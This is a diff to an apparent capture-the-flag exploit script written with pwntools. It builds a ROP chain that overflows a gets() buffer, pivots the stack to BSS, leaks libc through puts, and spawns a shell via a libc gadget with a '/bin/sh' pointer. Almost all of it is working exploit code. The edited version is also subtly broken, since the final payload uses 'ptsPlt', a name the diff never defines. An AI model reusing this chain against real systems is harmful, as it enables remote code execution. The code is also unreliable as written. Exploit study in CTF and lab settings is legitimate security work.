@@ -87,14 +87,14 @@ def search_binsh():
 
 if __name__ == "__main__":
 
-    pts_plt = 0x401060
-    pts_got = 0x000000000404018
-    gets_plt = 0x401070
-    gets_got = 0x000000000404020
-    rdi = 0x0000000000401663
-    rsi = 0x0000000000401661
-    BSS = 0x4041b0
-    leave = 0x0000000000401459
+    putsPlt = 0x401060
+    putsGot = 0x000000000404018
+    getsPlt = 0x401070
+    getsGot = 0x000000000404020
+    rdi_gag = 0x0000000000401663
+    rsi_gag = 0x0000000000401661
+    global_bss = 0x4041d0
+    leave_gag = 0x0000000000401459
     '''
     0000000000403ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
     0000000000403ff8 R_X86_64_GLOB_DAT  __gmon_start__
@@ -119,7 +119,8 @@ if __name__ == "__main__":
     # gdb.attach(p,'''
     # b *0x4015f2
     # ''')
-    payload = cyclic(0x100) + p64(BSS) + p64(rdi) + p64(gets_got) + p64(0x401060) + p64(rdi) + p64(BSS) + p64(gets_plt) + p64(leave) + p64(leave)
+    payload = cyclic(0x100) 
+    payload += p64(global_bss) + p64(rdi_gag) + p64(getsGot) + p64(0x401060) + p64(rdi_gag) + p64(global_bss) + p64(getsPlt) + p64(leave_gag) + p64(leave_gag)
 
     p.recv()
     p.sendline(payload)
@@ -127,13 +128,13 @@ if __name__ == "__main__":
     leak = int(hex(u64(p.recvline().strip().ljust(8,'\x00'))),16)-0x086af0 #0x000000000006ed80# -0x086af0
     print 'LEAK=',hex(leak)
 
-    payload2 = p64(0x000000000040101a)*10 + p64(rdi) + p64(BSS+0x8*13) + p64(gets_plt) 
+    payload2 = p64(0x000000000040101a)*10 + p64(rdi_gag) + p64(global_bss+0x8*13) + p64(getsPlt) 
     p.sendline(payload2)
     
-    win = leak + 0x00000000000e6160 #0x055410
-    sh = leak + 0x1b75aa
-    rdx = leak+0x000000000011c1e1
-    payload3 =  p64(rdi) + p64(sh) + p64(pts_plt) + p64(rdi) + p64(sh) + p64(rsi) + p64(0)*2 + p64(rdx) + p64(0)*2 + p64(win)
+    target = leak + 0x00000000000e6160 #0x055410
+    sh_str = leak + 0x1b75aa
+    rdx_gag = leak+0x000000000011c1e1
+    payload3 =  p64(rdi_gag) + p64(sh_str) + p64(ptsPlt) + p64(rdi_gag) + p64(sh_str) + p64(rsi_gag) + p64(0)*2 + p64(rdx_gag) + p64(0)*2 + p64(target)
     p.sendline(payload3)
 
     # ============ GDB =========== #
